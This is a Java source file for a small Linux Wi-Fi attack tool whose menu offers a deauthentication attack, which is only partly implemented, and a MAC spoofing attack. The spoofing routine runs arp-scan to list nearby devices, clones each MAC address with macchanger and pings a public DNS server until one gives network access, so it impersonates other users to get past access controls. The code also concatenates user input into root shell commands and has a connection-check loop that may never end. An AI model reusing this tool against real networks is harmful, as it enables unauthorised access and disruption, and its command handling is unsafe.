package com.company;

import java.io.*;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Scanner;

public class Main {
    private static Scanner scanner = new Scanner(System.in);
    static String wi = "wlp5s0";
    static String mwi = wi + "mon";
    static boolean monitorMde = false;

    public static void main(String[] args) throws IOException, NoSuchAlgorithmException, InterruptedException {
        System.out.println("It is highly recommended to run this program with sudo");


        if (System.getProperty("os.name").startsWith("Windows")) { //this program can currently only run on linux
            System.out.println("Please run within the windows ubuntu filesystem.");
             System.exit(0);
        } else if (System.getProperty("os.name").startsWith("mac")) {
            System.out.println("Sorry, macOS isn't supported yet, please run from a vm.");
             System.exit(0);
        } else checkdep(); //check that necessary dependencies are installed


        System.out.println("Success! PUIAS has been successfully started ");

        while (true) {

            System.out.println("----------------------------------------------------"); //print options
            System.out.println("|Hello what would you like to do today?            |");
            System.out.println("|                                                  |");
            System.out.println("|                                                  |");
            System.out.println("|edit - edit wireless card name (curently: " + wi + ") |");
            System.out.println("|                                                  |");
            System.out.println("| 1 - launch deauth attack                         |");
            //   System.out.println("| 2 - launch WPA attack");
            System.out.println("| 3 - launch MAC spoofing attack                   |");
            System.out.println("----------------------------------------------------");

            String in = scanner.nextLine();

            if (in.equals("edit")) { //change wireless card name
                System.out.println("Enter card name in standard mode: ");
                wi = scanner.nextLine();
                System.out.println("Done! wireless card is now: " + wi);

                System.out.println("Enter card name in monitor mode: ");
                mwi = scanner.nextLine();
                System.out.println("Done! monitor wireless card is now: " + mwi);

            }
            if (in.equals("1")) {
                ArrayList<String> bssid_list = execute("iw " + wi + " scan | egrep '^BSS|SSID:'", true); //scan networks and get bssid and essid
                System.out.println(bssid_list);
                for (int i = 0; i < bssid_list.size() - 1; i += 2) { //dor each essid bssid pair
                    String bss = bssid_list.get(i).split(" ")[1].split("\\(")[0]; //first entry is bssid
                    String ess = bssid_list.get(i + 1).split(" ")[1]; //second entry is essid
                    System.out.println(ess + " " + bss);
                }

            }
            if (in.equals("3")) {
                ArrayList<String> macs = execute("arp-scan -l", true); //get all mac adresses via arp-scan
                macs.remove(0); //remove heders
                macs.remove(0);
                macs.remove(macs.size() - 1);
                macs.remove(macs.size() - 1);
                macs.remove(macs.size() - 1);
                System.out.println(macs.size() + " possible targets found: ");
                for (int i = 0; i < macs.size(); i++) {
                    macs.set(i, macs.get(i).split("\t")[1]); //add mac to arraylist
                    System.out.println(macs.get(i)); //print said mac
                }
                for (String mac : macs) {
                    if (trymac(mac)) { //try each mac
                        System.out.println("success! "+mac); //id succesfull print so
                        break;
                    }
                }

            }
        }
    }

//    public static void startMonitorMode(){
//        if(!monitorMde){
//            execute("airmon-ng check kill", true);
//            execute("airmon-ng start "+wi, true);
//        }
//    }
//
//    public static void stopMonitorMode(){
//        if(!monitorMde){
//            execute("airmon-ng stop "+mwi, true);
//            execute("service network-manager restart", true);
//        }
//    }

    private static void checkdep() throws IOException {
        System.out.println("checking dep");
        boolean aircrack = checkpackage("aircrack-ng"); //check each package if installed
        boolean macchanger = checkpackage("macchanger");
        boolean arpscan = checkpackage("arp-scan");
        boolean pkexec = checkpackage("pkexec");


        if (!macchanger || !aircrack || !arpscan||!pkexec) {//if any package is missing
            System.out.println("Error, some of the application requirements are missing");

            File dep = new File("dep.sh");
            dep.delete(); //delete existing dep.sh file
            BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(dep));
            bufferedWriter.write("#!/bin/sh"); //create a new bash script


            if (!pkexec) { //for each missing package push an install line
                bufferedWriter.newLine();
                bufferedWriter.write("sudo apt install pkexec");
            }
            if (!macchanger) {
                bufferedWriter.newLine();
                bufferedWriter.write("sudo apt install macchanger");
            }
            if (!arpscan) {
                bufferedWriter.newLine();
                bufferedWriter.write("sudo apt install arp-scan");
            }
            if (!aircrack) {
                bufferedWriter.newLine();
                bufferedWriter.write("sudo apt install aircrack-ng");
            }
            bufferedWriter.close();
            System.out.println("please run: 'chmod +x dep.sh' and 'sudo bash dep.sh' (two commands, no quotes)"); //print execution instructions
            System.exit(0);
        }
    }


    private static boolean checkpackage(String packageS) {
        ArrayList<String> pkg_stat = execute("which " + packageS, false); //check if package is installed via which command
        boolean installed = pkg_stat.size() > 0;
        System.out.println(packageS + (installed ? " [OK]" : "[!]"));
        return installed;
    }


    private static ArrayList<String> execute(String command, boolean sudo) {
        if (sudo) {
            command = "pkexec " + command; // if sudo is required append pkexec to the start(graphical request for sudo)
        }

        ArrayList<String> out = new ArrayList<>();
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", command}); //run command

            p.waitFor(); //wait for process to complete

            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); //std::out output
            BufferedReader error = new BufferedReader(new InputStreamReader(p.getErrorStream())); //std::error output

            String s;


            while ((s = br.readLine()) != null) //first read all std::output and append to result
                out.add(s);
            while ((s = error.readLine()) != null)//then do the same for std error
                out.add(s);
            p.destroy();
        } catch (Exception ignored) {
            ignored.printStackTrace();
        }
        return out;
    }


    private static ArrayList<String> change_mac(String mac) {
        ArrayList<String> execute = execute("ifconfig " + wi + " down && pkexec macchanger -m " + mac + " " + wi + "&& pkexec ifconfig " + wi + " up", true); //bring adpter down, change mac, bring it back up again
        execute("nmcli radio wifi off", true);//restart network adapter
        execute("nmcli radio wifi on", true);
        return execute;
    }

    private static boolean trymac(String mac) {
        change_mac(mac); //change mac address
        boolean conected = false; //try 5 times to check connection to network
        for (int i = 0; i < 5 || conected; i++) {
            conected = !execute("ping 8.8.8.8 -c 4", false).contains("connect: Network is unreachable");
        }
        ArrayList<String> ping = execute("ping 8.8.8.8 -c 6", false); //ping google dns server and return !( if packet loss was 100% or ping failed)
        System.out.println(ping);
        return !(ping.contains("100% packet loss") || ping.size() == 0);
    }


}